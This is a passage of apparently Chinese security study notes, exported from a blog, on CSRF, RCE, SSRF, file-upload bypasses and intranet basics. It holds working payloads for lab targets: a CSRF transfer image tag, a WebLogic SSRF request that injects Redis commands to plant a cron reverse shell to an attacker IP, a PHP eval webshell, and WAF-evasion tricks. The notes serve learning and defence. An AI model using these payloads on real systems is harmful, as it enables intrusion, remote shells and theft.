<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.mybank.com/Transfer.php?toBankId</span>=<span class="string">11&amp;money</span>=<span class="string">1000</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当受害者登录银行，然后被钓鱼或是诱导点击了攻击者的链接，这样<img>以GET的方式进行了转账操作</p>
<p>后面改进的示例就不列举了，大概总结就是<code>$_REQUEST</code>既可以获取get请求的数据，也可以获取post请求的数据，当后台使用<code>$_REQUEST</code>获取数据时还是存在无法区分</p>
<blockquote>
<p>在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题</p>
</blockquote>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>最好是有目标站点的CMS，在本地搭建并构造一下例如创建管理员，开放权限等数据包，通过钓鱼等手段诱导管理员点击，执行数据包；要是没有目标站点的cms，也可以尝试抓包构造一下，不过有一定难度</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是<strong>来自于某个用户的浏览器</strong>，但却<strong>无法保证该请求是用户批准发送的</strong></p>
<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><h4 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h4><ol>
<li>验证http referer字段</li>
</ol>
<p>referer就是记录了请求的来源（同源策略）</p>
<blockquote>
<p>然而，这种方法并非万无一失。Referer  的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer  的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer  值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全</p>
</blockquote>
<p>因为服务器并不是什么时候都能取到Referer，也可以通过抓包修改进行绕过，所以也无法作为CSRF防御的主要手段。但是用Referer Check来监控CSRF攻击的发生，倒是一种可行的方法</p>
<h4 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h4><ol start="2">
<li>添加token并验证</li>
</ol>
<p>一致的做法是使用一个token（<strong>Anti CSRF Token</strong>）</p>
<p>用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅谈CSRF攻击方式</a></p>
<p><a href="https://www.cnblogs.com/lsj-info/p/9479755.html">CSRF攻击原理以及防御方法</a></p>
]]></content>
      <categories>
        <category>csrf</category>
      </categories>
      <tags>
        <tag>csrf</tag>
      </tags>
  </entry>
  <entry>
    <title>常见web漏洞学习之RCE</title>
    <url>/2021/07/20/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BRCE/</url>
    <content><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>remote command/code execute</p>
<p>远程命令执行和远程代码执行</p>
<h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>两者是有本质区别的，命令执行是针对系统命令，而代码执行是针对脚本代码，如php,java,py等</p>
<p>形成条件：可控变量，漏洞函数</p>
<p>echo,eval,print区别</p>
<h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><h4 id="产生"><a href="#产生" class="headerlink" title="产生"></a>产生</h4><h5 id="web源码-框架"><a href="#web源码-框架" class="headerlink" title="web源码/框架"></a>web源码/框架</h5><ol>
<li>thinkPHP php开发框架</li>
</ol>
<p>存在的版本就很多了，从3.x，5.0，5.0.10，5.0.23等若干版本</p>
<blockquote>
<p>要专开一篇来记录</p>
<p><img src="https://i.loli.net/2021/07/21/JzgGi7aL1xqZTkS.png" alt="image-20210721192942401"></p>
</blockquote>
<ol start="2">
<li>WordPress 基于php的博客平台，可以搭建网站也可以当做cms来使用</li>
</ol>
<blockquote>
<p>想到了hexo，也是搭建博客的一个框架，不过hexo搭建静态站点，WordPress搭建动态站点，可以使用数据库（跑偏了）</p>
</blockquote>
<p>4.6和5.0.0存在RCE</p>
<h5 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h5><ul>
<li>Tomcat</li>
</ul>
<blockquote>
<p>Tomcat的RCE有CVE-2017-12615，CVE-2019-0232</p>
<p>附CVE-2019-0232复现:</p>
<p><a href="https://www.cnblogs.com/liliyuanshangcao/p/10731966.html">Apache Tomcat 远程代码执行漏洞（CVE-2019-0232）漏洞复现</a></p>
<p><a href="https://www.sohu.com/a/214814902_354899">Tomcat远程代码执行漏洞分析与利用</a></p>
</blockquote>
<ul>
<li>Redis</li>
</ul>
<p>基于主从复制的rce</p>
<ul>
<li>Apache Struts2</li>
</ul>
<p>有很多RCE，就直接上工具了</p>
<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>敏感函数禁用，变量过滤或是固定，waf</p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="产生-1"><a href="#产生-1" class="headerlink" title="产生"></a>产生</h4><h5 id="web源码"><a href="#web源码" class="headerlink" title="web源码"></a>web源码</h5><blockquote>
<p>nexus,webmin,elasticSearch</p>
</blockquote>
<h5 id="中间件-1"><a href="#中间件-1" class="headerlink" title="中间件"></a>中间件</h5><blockquote>
<p>weblogic,apache</p>
</blockquote>
<h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><blockquote>
<p>postgresql</p>
</blockquote>
<h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2>]]></content>
      <categories>
        <category>rce</category>
      </categories>
      <tags>
        <tag>rce</tag>
      </tags>
  </entry>
  <entry>
    <title>常见web漏洞学习之SSRF</title>
    <url>/2021/07/15/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BSSRF/</url>
    <content><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><img src="https://i.loli.net/2021/07/17/FxWvNe42sRnGHqt.png" alt="image-20210717161639133"></p>
<p><img src="https://i.loli.net/2021/07/17/smd1vkM65KeSaHn.png" alt="image-20210717161814292"></p>
<p><img src="https://i.loli.net/2021/07/17/UvSWRuVZxiHkomn.png" alt="image-20210717161911196"></p>
<p><img src="https://i.loli.net/2021/07/17/HsaJXe45FlEY9cL.jpg" alt="img"></p>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Server Side Request Forgery 服务端请求伪造</p>
<p>是由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF攻击的目标是从外网无法访问的内部系统</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>很多web应用都提供了从其他的服务器上获取数据的功能，如使用指定的url，web应用就可以获取图片，下载文件，读取文件内容等（这个url是远程的url，并不是本地的，<del>说了个废话</del>）</p>
<p>SSRF的实质是<strong>利用存在缺陷的web应用作为代理来进行攻击</strong>远程和本地的服务器</p>
<p>SSRF形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>且没有<strong>对目标地址做过滤与限制</strong></p>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p><img src="https://i.loli.net/2021/07/18/HKf8lbk4BOJeNdA.jpg" alt="9907e251f785494d92c746eb5df60541"></p>
<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
<li>内外网的端口和服务扫描</li>
<li>对内网Web应用进行指纹识别，识别企业内部的资产信息，通过访问默认文件实现(如：readme文件)</li>
<li>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等</li>
<li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li>
<li>下载内网资源，利用file协议读取本地敏感数据文件等</li>
<li>进行跳板</li>
</ul>
<h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><ul>
<li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li>
<li>http/https协议：探测内网主机存活</li>
<li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
<li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li>
</ul>
<h3 id="weblogic-ssrf复现"><a href="#weblogic-ssrf复现" class="headerlink" title="weblogic ssrf复现"></a>weblogic ssrf复现</h3><h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><p><img src="https://i.loli.net/2021/07/18/64S8lLxKy1sbThH.png" alt="image-20210718153704526"></p>
<p>查看靶场说明</p>
<p>进入weblogic的ssrf的目录下，使用<code>gedit</code>命令查看<code>README.md</code></p>
<p><img src="https://i.loli.net/2021/07/18/NioHV94KcWQdUkC.png" alt="image-20210718154456328"></p>
<p>xshell会让提示下Xmanger</p>
<p><img src="https://i.loli.net/2021/07/18/AdLikoaK5s18p9V.png" alt="image-20210718154647511"></p>
<p>直接下本地看</p>
<p>访问<code>ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer应用</p>
<p><img src="https://i.loli.net/2021/07/18/SlbMwNYxXPvj9aQ.png" alt="image-20210718155843581"></p>
<p>访问<code>ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
<p>​    <img src="https://i.loli.net/2021/07/18/E3xOf6zXK4kup1G.png" alt="image-20210718160744237"></p>
<h4 id="探测内网状态"><a href="#探测内网状态" class="headerlink" title="探测内网状态"></a>探测内网状态</h4><p><img src="https://i.loli.net/2021/07/18/aQI3ivkAp8MFUcV.png" alt="image-20210718162349626"></p>
<p>构造payload来检验端口是否开放并且是否为HTTP协议<code>operator=http://127.0.0.1:7001</code>，返回<code>status code</code>就说明端口开放并且为HTTP协议</p>
<p><img src="https://i.loli.net/2021/07/18/r2c6UPX3liFnHxC.png" alt="image-20210718162817388"></p>
<p>尝试一个不存在的端口<code>7777</code>，返回<code>could not connect over HTTP to server</code>，就是说明端口不存在</p>
<p><img src="https://i.loli.net/2021/07/18/1MaoVAP6WU9kXwd.png" alt="image-20210718163712297"></p>
<p>如果端口开放访问的是非http协议，则会返回<code>did not have a valid SOAP content-type</code></p>
<p><img src="https://i.loli.net/2021/07/18/a921AiY4epylb5h.png" alt="image-20210718164622656"></p>
<p>在查看Redis端口开放状态时，一直不行，看一下才发现是没有起来</p>
<p><img src="https://i.loli.net/2021/07/18/JcSrjMtdWQusE89.png" alt="image-20210718171022778"></p>
<h4 id="探测Redis端口情况"><a href="#探测Redis端口情况" class="headerlink" title="探测Redis端口情况"></a>探测Redis端口情况</h4><p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现<code>172.18.0.1:6379</code>可以连通：</p>
<blockquote>
<p>也可以写个脚本跑一下</p>
</blockquote>
<p><img src="https://i.loli.net/2021/07/18/nDTQKp3m9Zro1uH.png" alt="image-20210718171256048"></p>
<h4 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h4><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器</p>
<h4 id="发送Redis命令，将弹shell脚本写入-etc-crontab"><a href="#发送Redis命令，将弹shell脚本写入-etc-crontab" class="headerlink" title="发送Redis命令，将弹shell脚本写入/etc/crontab"></a>发送Redis命令，将弹shell脚本写入<code>/etc/crontab</code></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;公网ip&#x2F;port 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>


<h5 id="对其进行url编码"><a href="#对其进行url编码" class="headerlink" title="对其进行url编码"></a>对其进行url编码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F公网ip%2F监听端口%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave</span><br></pre></td></tr></table></figure>
<p>注：换行符是“\r\n”，也就是“%0D%0A”</p>
<blockquote>
<p>\r是回车，\n是换行</p>
</blockquote>
<p>将url编码后的字符串放在ssrf域名后面，go</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.18.0.1:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F公网ip%2F监听端口%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/18/4B1TI6QFdS7uNtH.png" alt="image-20210718201905032"></p>
<p><code>nc -lvp 4444</code></p>
<p>可进行利用的cron还有以下几个地方</p>
<ul>
<li>/etc/crontab 这个是肯定的</li>
<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
</ul>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ol>
<li><p>@　　　　　　　　　　<a href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p>
</li>
<li><p>添加端口号　　　　　　<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
</li>
<li><p>短地址　　　　　　　　<a href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a></p>
</li>
<li><p>可以指向任意ip的域名　 xip.io</p>
</li>
<li><p>ip地址转换成进制来访问 192.168.0.1=32322</p>
</li>
</ol>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.freebuf.com/company-information/220086.html">SSRF漏洞攻击原理及防御方案</a></p>
<p><a href="https://www.t00ls.net/articles-41070.html">SSRF漏洞(原理&amp;绕过姿势)</a></p>
<p><a href="https://blog.csdn.net/weixin_41679427/article/details/110312158">SSRF攻击姿势汇总</a></p>
<p><a href="https://blog.csdn.net/lhh134/article/details/88298881">Weblogic SSRF漏洞（CVE-2014-4210）</a></p>
<p><a href="https://blog.csdn.net/weixin_46789316/article/details/116531565">漏洞复现-vulhub复现Weblogic的SSRF漏洞</a></p>
]]></content>
  </entry>
  <entry>
    <title>常见web漏洞学习之文件上传知识点总结</title>
    <url>/2021/05/26/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="常见web漏洞学习之文件上传"><a href="#常见web漏洞学习之文件上传" class="headerlink" title="常见web漏洞学习之文件上传"></a>常见web漏洞学习之文件上传</h2><blockquote>
<p>.htacess的Apache解析漏洞</p>
<p>配合文件包含，图片马</p>
<p>条件竞争</p>
</blockquote>
<h3 id="客户端验证"><a href="#客户端验证" class="headerlink" title="客户端验证"></a>客户端验证</h3><p>js校验后缀名</p>
<p>绕过：先把木马改为jpg或其他形式，burp抓包后修改为php</p>
<h3 id="服务端验证"><a href="#服务端验证" class="headerlink" title="服务端验证"></a>服务端验证</h3><ol>
<li>MIME</li>
</ol>
<p>绕过：burp修改文件头content-type字段为image/gif</p>
<ol start="2">
<li>文件内容头</li>
</ol>
<p>在<img src alt="img">马之前加上一些图片信息，如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a&lt;?php @eval($_POST[&#39;caidao&#39;]);?&gt;</span><br></pre></td></tr></table></figure>


<ol>
<li>文件扩展名校验（白名单，黑名单）</li>
<li>文件内容检测（检测内容是否合法或是是否有恶意代码）</li>
</ol>
<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><ol>
<li><strong>大小写、双写</strong>绕过pphphp</li>
<li>文件名后加上个**.<strong>或是</strong>空格**（burp中修改）</li>
</ol>
<ul>
<li>🔲尝试黑名单可能没有的类型，如<strong>asa、cer、.htaccess</strong></li>
</ul>
<blockquote>
<p>.htaccess是Apache的</p>
</blockquote>
<ol start="4">
<li><p>修改后缀类型，php修改为<strong>php3、php5</strong>（php高版本会向低版本兼容）</p>
</li>
<li><p>针对Windows系统，上传不符合Windows命名规则的文件名，可以尝试**::$DATA<strong>进行绕过或是</strong>:1.jpg**</p>
</li>
</ol>
<blockquote>
<p>windows下文件名+::$DATA，会把它当做数据流来处理，不会检验文件的后缀名，并且保留::$DATA之前的的文件名及后缀</p>
<p>简单来说，数据流$DATA是Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性DATA时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容。</p>
</blockquote>
<ol start="6">
<li><strong>%00</strong>截断，解析的时候会自动忽略%00后面的内容</li>
</ol>
<blockquote>
<ul>
<li>常用在服务端把文件路径和文件名加在一起进行判断后缀</li>
<li>截断条件：</li>
</ul>
<p><em>php &lt; 5.3.4</em></p>
<p>php.ini文件<em>magic_quotes_gpc</em>为<em>off</em>（这个函数的作用是转义字符，在php&gt;5.4.0中已经移除了） </p>
<ul>
<li>当参数是以post方式传入时，需要二进制修改 <code>2e</code>改为<code>00</code></li>
</ul>
</blockquote>
<ol start="7">
<li>🔲配合<strong>文件包含</strong>使用</li>
</ol>
<blockquote>
<p>上传<strong>图片马</strong></p>
<p>拼接图片马：copy xxx.jpg /b + shell.php /a shell.jpg （b是binary二进制的意思，/b就是以二进制的格式）</p>
<p>进行文件包含</p>
</blockquote>
<ol start="8">
<li>🔲<strong>条件竞争</strong></li>
</ol>
<blockquote>
<p>简单来说就是利用了并发处理请求不当或是相关操作逻辑顺序设计不合理时，会导致条件竞争的发生</p>
<p>具体实例可见upload-labs pass17、18</p>
<p>pass17源码 – 利用方式：在文件删除之前访问文件</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];  &#x2F;&#x2F;$_FILES数组，$file_name就是upload_file的文件名</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];  &#x2F;&#x2F;$temp_file就是upload_file的临时文件名</span><br><span class="line">    $file_ext &#x3D; substr($file_name,strrpos($file_name,&quot;.&quot;)+1);  &#x2F;&#x2F;返回$file_name的文件后缀</span><br><span class="line">    $upload_file &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;  &#x2F;&#x2F;对$temp_file进行合法检验</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;  &#x2F;&#x2F;判断$file_ext是否在$ext_arr中，即判断文件后缀是否合法</span><br><span class="line">             $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload &#x3D; true;</span><br><span class="line">        &#125;else&#123;  &#x2F;&#x2F;如果后缀不合法</span><br><span class="line">            $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>






<h3 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h3><ul>
<li>trim(string,charlist) ——<strong>移除</strong>字符串两侧的空白或其他预定义的字符charlist</li>
<li>strrchr(string,char) ——在string中<strong>查找</strong>char最后出现的位置，并返回（<strong>截取</strong>）包括char在内到字符串末尾的所有字符</li>
<li>str_ireplace(find,replace,string) ——在string中找到find，然后进行<strong>替换</strong>replace</li>
<li>substr(string,start,length可选) ——在string中从start处开始，<strong>返回</strong>length长度的<strong>字符串</strong></li>
<li>strrpos(string,find,start可选) ——在string中从start开始，<strong>返回</strong>最后一次出现的<strong>位置</strong></li>
<li>move_uploaded_file(string $filename,string $destination) ——检测确保上传的文件filename是合法的（即通过post方式上传），如果合法就将其<strong>移动</strong>为由destination指定的文件</li>
<li>in_array(data,array) —— 检查数组array中是否存在某个值data</li>
</ul>
<h2 id="bypass之waf"><a href="#bypass之waf" class="headerlink" title="bypass之waf"></a>bypass之waf</h2><p>总体的思路就是让waf无法获取到文件名或是其他方式无法判断上传的木马（php、jsp、asp、aspx等）</p>
<h3 id="waf检查的东西"><a href="#waf检查的东西" class="headerlink" title="waf检查的东西"></a>waf检查的东西</h3><p>根据前面的学习，猜测waf会检查</p>
<ul>
<li>MIME类型</li>
<li>文件扩展名</li>
<li>文件内容</li>
</ul>
<p>除此之外还会检查</p>
<ul>
<li>请求的url</li>
<li>Boundary边界</li>
</ul>
<h3 id="常见扩展名黑名单："><a href="#常见扩展名黑名单：" class="headerlink" title="常见扩展名黑名单："></a>常见扩展名黑名单：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">asp|asa|cer|cdx|aspx|ashx|ascx|asax</span><br><span class="line"></span><br><span class="line">php|php2|php3|php4|php5|asis|htaccess</span><br><span class="line"></span><br><span class="line">htm|html|shtml|pwml|phtml|phtm|js|jsp</span><br><span class="line"></span><br><span class="line">vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini</span><br></pre></td></tr></table></figure>


<p>这里并没有进行复现，只是可能进行绕过的一些思路</p>
<h3 id="增加Content-Disposition字段长度"><a href="#增加Content-Disposition字段长度" class="headerlink" title="增加Content-Disposition字段长度"></a>增加Content-Disposition字段长度</h3><blockquote>
<p>在常规的 HTTP 应答中，Content-Disposition 响应头指示回复的内容该以何种形式展示，是以内联的形式（即网页或者页面的一部分），还是以附件的形式下载并保存到本地。</p>
<p>在  multipart/form-data 类型的应答消息体中，Content-Disposition 消息头可以被用在 multipart  消息体的子部分中，用来给出其对应字段的相关信息。各个子部分由在Content-Type 中定义的分隔符分隔。用在消息体自身则无实际意义。</p>
<p>Content-Disposition 消息头最初是在 MIME 标准中定义的，HTTP 表单及 POST 请求只用到了其所有参数的一个子集。只有 form-data 以及可选的 name 和 filename 三个参数可以应用在HTTP场景中。</p>
</blockquote>
<h3 id="对文件名进行修改"><a href="#对文件名进行修改" class="headerlink" title="对文件名进行修改"></a>对文件名进行修改</h3><ol>
<li>去除filename=”shell.php”中的双引号或是修改为单引号，扰乱匹配</li>
<li>因为文件在上传时接收的是最后一个文件，那么尝试在这之前加一些干扰的filename参数</li>
</ol>
<blockquote>
<p>Content-Disposition: form-data; name=”file”; filename=1.jpg;  filename=”shell.php”</p>
</blockquote>
<ol>
<li>当是对所有的filename进行检测时，尝试将前面的filename去掉</li>
</ol>
<blockquote>
<p>Content-Disposition: form-data; name=”file”; filename= ;  filename=”shell.php”</p>
</blockquote>
<h3 id="在文件名中间加符号扰乱匹配，如"><a href="#在文件名中间加符号扰乱匹配，如" class="headerlink" title="在文件名中间加符号扰乱匹配，如"></a>在文件名中间加符号扰乱匹配，如</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;</span><br><span class="line">&#39;</span><br><span class="line"> (空格)</span><br></pre></td></tr></table></figure>
<h3 id="对filename动手脚"><a href="#对filename动手脚" class="headerlink" title="对filename动手脚"></a>对filename动手脚</h3><blockquote>
<p>让waf对filename这个字符串匹配不到，但是服务器又可以接收，加入换行这类的干扰</p>
</blockquote>
<h4 id="可能的绕过"><a href="#可能的绕过" class="headerlink" title="可能的绕过"></a>可能的绕过</h4><ol>
<li>对文件名中的每个字符进行换行</li>
<li>切断filename=和之后的值（换行）</li>
<li>文件名换行，就是在HEX中加入0a</li>
</ol>
<h3 id="修改匹配字段"><a href="#修改匹配字段" class="headerlink" title="修改匹配字段"></a>修改匹配字段</h3><blockquote>
<p>filename参数是在post包中的 Content-Disposition 字段，那么waf也是先匹配到这个http头在对内容进行检测，我们可以尝试对这个头的特征进行修改</p>
<p>我们尝试去掉这个form-data   (form-data;的意思是内容描述，form-data的意思是来自表单的数据，但是即使不写form-data，apache也接受。)</p>
</blockquote>
<ol>
<li>去掉form-data</li>
<li>对Content-Disposition 字段进行参数污染、Content-Disposition大小写混淆</li>
</ol>
<blockquote>
<p>Content-Disposition 字段参数污染</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1622537709838-cca051af-9c06-47ed-afb8-bc4fa3a77a03.png" alt="image.png"></p>
<ol>
<li>添加额外的Content-Type字段</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1622537878758-5e4a903f-245e-4d4d-b8c0-483ac68a0bde.png" alt="image.png"></p>
<ol>
<li>添加额外的filename进行参数污染</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1622537967923-04649433-fbab-4386-8491-0b0b08e35ed6.png" alt="image.png"></p>
<ol>
<li>添加额外的Content-Length头</li>
</ol>
<h3 id="多个等号"><a href="#多个等号" class="headerlink" title="多个等号"></a>多个等号</h3><blockquote>
<p>就是将filename=处添加多个等号</p>
</blockquote>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><blockquote>
<p>产生的原因是0x00为十六进制表示法，ASCII码里就为0，有些函数在处理时会将其当做结束符；当url中出现%00会认为读取已经结束</p>
</blockquote>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>[文件上传Bypass安全狗 ](</p>
<h3 id="参考的一些博客"><a href="#参考的一些博客" class="headerlink" title="参考的一些博客"></a>参考的一些博客</h3><p><a href="https://blog.csdn.net/qq_39670065/article/details/107366077?spm=1001.2014.3001.5501">upload-labs通关记录</a></p>
<p><a href="https://xz.aliyun.com/t/4029#toc-15">Upload-labs 20关通关笔记</a></p>
<p><a href="https://wiki.wgpsec.org/knowledge/web/fileuploads.html">狼组公开文库</a></p>
<p><a href="https://www.cnblogs.com/luolaobiao/p/9917878.html">常见的文件上传绕过和文件解析漏洞</a></p>
]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>内网学习笔记</title>
    <url>/2021/07/05/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="内网学习笔记"><a href="#内网学习笔记" class="headerlink" title="内网学习笔记"></a>内网学习笔记</h1><h2 id="一、基础概念学习"><a href="#一、基础概念学习" class="headerlink" title="一、基础概念学习"></a>一、基础概念学习</h2><h3 id="工作组work-group"><a href="#工作组work-group" class="headerlink" title="工作组work group"></a>工作组<code>work group</code></h3><p>使最简单最普通的资源管理模式</p>
<p>将不同的计算机按照功能或部门分别列入不同的工作组，想要访问某个工作组的内容，在“网上邻居”里双击想要访问的工作组即可</p>
<h4 id="加入-创建工作组"><a href="#加入-创建工作组" class="headerlink" title="加入/创建工作组"></a>加入/创建工作组</h4><p>控制面板–&gt;系统安全–&gt;系统</p>
<p>重命名这台电脑–&gt;更改</p>
